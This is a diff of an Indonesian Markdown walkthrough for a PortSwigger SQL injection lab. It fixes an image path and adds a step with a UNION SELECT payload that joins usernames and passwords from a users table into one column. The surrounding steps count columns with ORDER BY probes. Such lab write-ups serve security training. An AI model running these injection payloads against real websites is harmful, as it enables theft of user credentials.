@@ -26,13 +26,13 @@ https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-mu
 
 3. kemudian kita dapat menentukan jumlah kolom dengan ORDER BY `/filter?category=Gifts'+ORDER+BY+2--` sesuai dengan gambar diatas yang mana jika tidak error berarti jumlah kolom minimal 2 kolom.
 
-![sql](../../img/sqli-unioncolumn)
+![sql](../../img/sqli-unioncolumn/3.png)
 
 4. lalu Tes UNION SELECT valid `/filter?category=Gifts'+UNION+SELECT+NULL,NULL--`
 
 ![sql](../../img/sqli-unioncolumn)
 
-5.
+5. gabungkan username dan password `/filter?category=Gifts'+UNION+SELECT+NULL,username||':password is:'||password+FROM+users--` Karena kita diminta menampilkan dua nilai dalam satu kolom, kita gunakan concatenation operator (||) di Oracle (atau CONCAT() di MySQL).
 
 ### Catatan
 
